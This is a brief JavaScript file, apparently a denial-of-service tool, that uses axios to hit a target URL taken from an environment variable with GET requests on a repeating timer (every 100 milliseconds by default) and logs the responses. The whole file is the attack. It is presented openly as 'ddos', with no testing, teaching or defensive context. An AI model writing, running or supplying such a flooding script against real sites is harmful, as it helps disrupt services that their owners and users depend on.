const { default: axios } = require("axios");

const ddos = (url, time = 100) => {
  console.log(`[START] - ${url} - ${time}`);
  if (url) {
    setInterval(() => {
      axios
        .get(url)
        .then((res) => console.log(res.status))
        .catch((err) => console.log("erro"));
    }, time);
  }
};

ddos(process.env.URL, process.env.TIME);
